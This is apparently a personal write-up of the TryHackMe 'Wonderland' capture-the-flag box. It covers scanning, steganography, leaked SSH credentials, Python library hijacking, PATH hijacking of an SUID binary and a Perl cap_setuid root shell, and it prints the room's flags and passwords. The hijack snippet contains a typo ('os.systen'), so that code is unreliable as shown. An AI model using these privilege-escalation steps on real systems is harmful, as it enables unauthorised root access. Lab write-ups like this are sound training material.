# Box Name

## Wonderland

## Overview
---
* [[#Enumeration]]

* [[#Initial Foothold]]

* [[#Privilege Escalation]]

---
## Enumeration
---
- ## nmap
```bash
┌──(kn1ght㉿Kali)-[~/THM/wonderland]
└─$ rustscan -a 10.10.143.9  --ulimit 5000 -- -sCV             
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/scott/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.143.9:22
Open 10.10.143.9:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDe20sKMgKSMTnyRTmZhXPxn+xLggGUemXZLJDkaGAkZSMgwM3taNTc8OaEku7BvbOkqoIya4ZI8vLuNdMnESFfB22kMWfkoB0zKCSWzaiOjvdMBw559UkLCZ3bgwDY2RudNYq5YEwtqQMFgeRCC1/rO4h4Hl0YjLJufYOoIbK0EPaClcDPYjp+E1xpbn3kqKMhyWDvfZ2ltU1Et2MkhmtJ6TH2HA+eFdyMEQ5SqX6aASSXM7OoUHwJJmptyr2aNeUXiytv7uwWHkIqk3vVrZBXsyjW4ebxC3v0/Oqd73UWd5epuNbYbBNls06YZDVI8wyZ0eYGKwjtogg5+h82rnWN
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHH2gIouNdIhId0iND9UFQByJZcff2CXQ5Esgx1L96L50cYaArAW3A3YP3VDg4tePrpavcPJC2IDonroSEeGj6M=
|   256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAsWAdr9g04J7Q8aeiWYg03WjPqGVS6aNf/LF+/hMyKh
80/tcp open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

- ## http
	- ### webpage
	find link to the pic on main page 
	used stegseek to extract hint.txt
```bash
┌──(kn1ght㉿Kali)-[~/THM/wonderland]
└─$ stegseek img/white_rabbit_1.jpg ~/rockyou.txt 
StegSeek version 0.5
Progress: 0.00% (0 bytes)           

[i] --> Found passphrase: ""
[i] Original filename: "hint.txt"
[i] Extracting to "white_rabbit_1.jpg.out"

                                                                                                                                                                                                                                          
┌──(kn1ght㉿Kali)-[~/THM/wonderland]
└─$ cat hint.txt        
follow the r a b b i t                                                                                                                                                                                                                                           

```

from the hint went to the url  10.10.143.9/r/a/b/b/i/t/
read html source code found alices creds
alice:HowDothTheLittleCrocodileImproveHisShiningTail
## Initial Foothold
---
- ## ssh
	- used alices creds to ssh in to the box
```bash
┌──(kn1ght㉿Kali)-[~/THM/wonderland]
└─$ ssh alice@10.10.143.9 
The authenticity of host '10.10.143.9 (10.10.143.9)' can't be established.
ED25519 key fingerprint is SHA256:Q8PPqQyrfXMAZkq45693yD4CmWAYp5GOINbxYqTRedo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.143.9' (ED25519) to the list of known hosts.
alice@10.10.143.9's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun May 29 23:40:59 UTC 2022

  System load:  0.0                Processes:           85
  Usage of /:   18.9% of 19.56GB   Users logged in:     0
  Memory usage: 13%                IP address for eth0: 10.10.143.9
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon May 25 16:37:21 2020 from 192.168.170.1
alice@wonderland:~$ 

```

---
## Privilege Escalation


- ## alice
```bash
alice@wonderland:~$ sudo -l -l
[sudo] password for alice: 
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:

Sudoers entry:
    RunAsUsers: rabbit
    Commands:
	/usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
alice@wonderland:~$ 

```


```bash
alice@wonderland:~$ cat /home/alice/walrus_and_the_carpenter.py
import random
poem = """The sun was shining on the sea,
Shining with all his might:
He did his very best to make
The billows smooth and bright —
And this was odd, because it was
The middle of the night.

The moon was shining sulkily,
Because she thought the sun
Had got no business to be there
After the day was done —
"It’s very rude of him," she said,
"To come and spoil the fun!"

The sea was wet as wet could be,
The sands were dry as dry.
You could not see a cloud, because
No cloud was in the sky:
No birds were flying over head —
There were no birds to fly.

#####Truncated#####

for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)alice@wonderland:~$ 

```

 
 looks like maybe python library hijacking 
create random.py 
```python
alice@wonderland:~$ vim random.py

#!/usr/bin/env python3

import os
os.systen("bash -p")
```

run the script as rabbit
```bash
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
rabbit@wonderland:~$ id
uid=1002(rabbit) gid=1002(rabbit) groups=1002(rabbit)
rabbit@wonderland:~$ 
```

```bash
abbit@wonderland:/home/rabbit$ ls -la
total 40
drwxr-x--- 2 rabbit rabbit  4096 May 25  2020 .
drwxr-xr-x 6 root   root    4096 May 25  2020 ..
lrwxrwxrwx 1 root   root       9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 rabbit rabbit   220 May 25  2020 .bash_logout
-rw-r--r-- 1 rabbit rabbit  3771 May 25  2020 .bashrc
-rw-r--r-- 1 rabbit rabbit   807 May 25  2020 .profile
-rwsr-sr-x 1 root   root   16816 May 25  2020 teaParty

```

cat the ELF file teaParty we can see that it calls date by a relative path

```bash

                                                                                             H�=�.�-����h�����.]�����{���UH���������������H�=t����H�=�����H�=���������H�=�n����]�f.��AWI��AVI��AUA��ATL�%,UH�-,SL)�H�����H��t�L��L��D��A��H��H9�u�H�[]A\A]A^A_��H�H��Welcome to the tea party!
The Mad Hatter will be here soon./bin/echo -n 'Probably by ' && date --date='next hour' -RAsk very nicely, and I will give you some tea while you wait for himSegmentation fault (core dumped)8,�������������T����������<���,zRx
                                                                                                                                                                                                                               @���+zRx
                                                                               
```

create file in /tmp named date 
```bash
bash -c /bin/bash -p

```

update PATH variable eith /tmp
run the ./teaParty binary get shell as hatter
```bash
rabbit@wonderland:/home/rabbit$ export PATH=/tmp:$PATH
rabbit@wonderland:/home/rabbit$ ./teaParty 

Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit$ id
uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)

```

```bash 
hatter@wonderland:/home/hatter$ ls -la
total 28
drwxr-x--- 3 hatter hatter 4096 May 25  2020 .
drwxr-xr-x 6 root   root   4096 May 25  2020 ..
lrwxrwxrwx 1 root   root      9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 hatter hatter  220 May 25  2020 .bash_logout
-rw-r--r-- 1 hatter hatter 3771 May 25  2020 .bashrc
drwxrwxr-x 3 hatter hatter 4096 May 25  2020 .local
-rw-r--r-- 1 hatter hatter  807 May 25  2020 .profile
-rw------- 1 hatter hatter   29 May 25  2020 password.txt
hatter@wonderland:/home/hatter$ cat password.txt 
WhyIsARavenLikeAWritingDesk?

```

su to hatter with new password
```bash
hatter@wonderland:/home$ su hatter 
Password: 
hatter@wonderland:/home$ id
uid=1003(hatter) gid=1003(hatter) groups=1003(hatter)

```


- ## capabilities
searched for files with capabilites set found perl used [[gtfobins]]

```bash 
hatter@wonderland:/home/alice$ getcap -r / 2>/dev/null
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
hatter@wonderland:/home/alice$ /usr/bin//perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
root@wonderland:/home/alice# id
uid=0(root) gid=1003(hatter) groups=1003(hatter)
```

```bash

root@wonderland:/home/alice# find / -name "*.txt" 2>/dev/null

/home/alice/root.txt
/home/hatter/password.txt
/root/user.txt

```

```bash

root@wonderland:/home/alice# cat root.txt 
thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}

root@wonderland:/home/alice# cat /root/user.txt 
thm{"Curiouser and curiouser!"}

root@wonderland:/home/alice# 
```